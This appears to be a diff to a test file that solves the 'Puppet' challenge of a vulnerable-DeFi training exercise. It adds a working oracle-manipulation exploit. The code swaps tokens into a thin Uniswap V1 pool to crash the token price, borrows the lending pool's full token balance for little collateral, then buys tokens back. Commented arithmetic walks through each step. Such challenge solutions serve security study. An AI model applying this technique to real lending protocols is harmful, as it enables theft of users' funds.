@@ -102,7 +102,102 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        
+        // Uniswap V1 Swap Example 1
+        // numerator = ETH_balance * DVT_In = 10 * 1000
+        // denominator = DVT_balance + DVT_In = 10 + 1000
+        // User gets 9.9009 ETH
+        // 1000 DVT -> POOL -> 9.9009 ETH
+        // Current Pool Balances
+        // 0.0991 ETH & 1010 DVT => 1 DVT = 0.0000981 ETH
+        // Calcualte the Collatoral to borrow 100000 DVT
+        // deposit twice the borrow amount in ETH
+        // 2 * (100000 * 0.0000981)  = 19.62 ETH > (25 ETH + 9.9009 ETH)
+        // attacker has -> 100000 DVT and 15 ETH
+        // Getting the pool back to its initial ratio of 1:1 or borrow back our 1000 DVT tokens
+        // 1000 DVT = 0.0000981 ETH
+        // Uniswap V1 Swap Example 2
+        // numerator = DVT_balance * ETH_In = 1010 * 10
+        // denominator = ETH_balance + ETH_In = 0.0991 + 10
+        // User gets 1000 DVT tokens
+        // 10 ETH -> POOL -> 1000 DVT
+        // Current Pool Balances
+        // 10 ETH & 10 DVT 
+        // attacker has -> 101000 DVT and 5 ETH
+
+        // Initialize the contracts
+        const lendingPool = this.lendingPool.connect(attacker);
+        const Token = this.token.connect(attacker);
+        const exchange = this.uniswapExchange.connect(attacker);
+
+        // Helper function to get current balances
+        const logBalances = async (address, name) => {
+            const ethBal = await ethers.provider.getBalance(address);
+            const tokenBal = await Token.balanceOf(address);
+
+            console.log(`ETH Balance of ${name}:`, ethers.utils.formatEther(ethBal));
+            console.log(`DVT Balance of ${name}:`, ethers.utils.formatEther(tokenBal));
+            console.log("");
+        }
+
+        await logBalances(attacker.address, "attacker");
+        await logBalances(exchange.address, "uniswap");
+
+        // Approve token to swap with UniSwap
+        console.log("Approving Initial Balance");
+        await Token.connect(attacker).approve(exchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        console.log("Balance approved");
+
+        // Calculate ETH Pay out
+        const ethPayout = await exchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE,
+            {
+                gasLimit: 1e6
+            });
+ 
+        console.log("Transfer of 1000 tokens will return ", ethers.utils.formatEther(ethPayout))
+
+        console.log("Transferring tokens for ETH");
+        await exchange.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE, // Exact amount of tokens to transfer
+            ethers.utils.parseEther("9"), // Min return of 9ETH
+            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
+        )
+
+        await logBalances(attacker.address, "attacker");
+        await logBalances(exchange.address, "uniswap");
+
+        // Deposit ETH required to gain ALL tokens from the pool
+        const deposit = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Deposit required:", ethers.utils.formatEther(deposit));
+        await lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {
+            value: deposit
+        })
+        console.log("Deposit of ETH to the pool completed");
+
+        await logBalances(attacker.address, "attacker");
+
+        const tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;
+        const ethReq = await exchange.getEthToTokenOutputPrice(tokensToBuyBack,
+        {
+            gasLimit: 1e6
+        })
+        console.log(`Eth Required for ${tokensToBuyBack} tokens:`, ethers.utils.formatEther(ethReq))
+
+        // Get our original 1000 tokens back by swapping eth
+        await exchange.ethToTokenSwapOutput(
+            tokensToBuyBack,
+            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
+            {
+                value: ethReq,
+                gasLimit: 1e6
+            }
+        )
+            
+        console.log("*** FINISHED ***")
+        await logBalances(attacker.address, "attacker");
+        await logBalances(lendingPool.address, "Lender");
+        await logBalances(exchange.address, "Uniswap");
+
     });
 
     after(async function () {
